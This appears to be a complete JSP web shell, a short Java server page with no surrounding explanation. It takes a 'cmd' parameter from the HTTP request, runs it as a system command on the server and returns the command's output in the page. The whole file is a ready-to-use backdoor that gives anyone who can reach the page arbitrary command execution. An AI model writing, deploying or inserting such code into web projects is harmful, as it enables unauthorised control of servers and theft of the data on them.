<%@ page import="java.util.*, java.io.*" %>
<%
String c = request.getParameter("cmd");
BufferedReader b = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(c).getInputStream()));
String line;
StringBuilder output = new StringBuilder();
while ((line = b.readLine()) != null) {
    output.append(line);
    output.append("<br/>");
}
b.close();
out.println(output.toString());
%>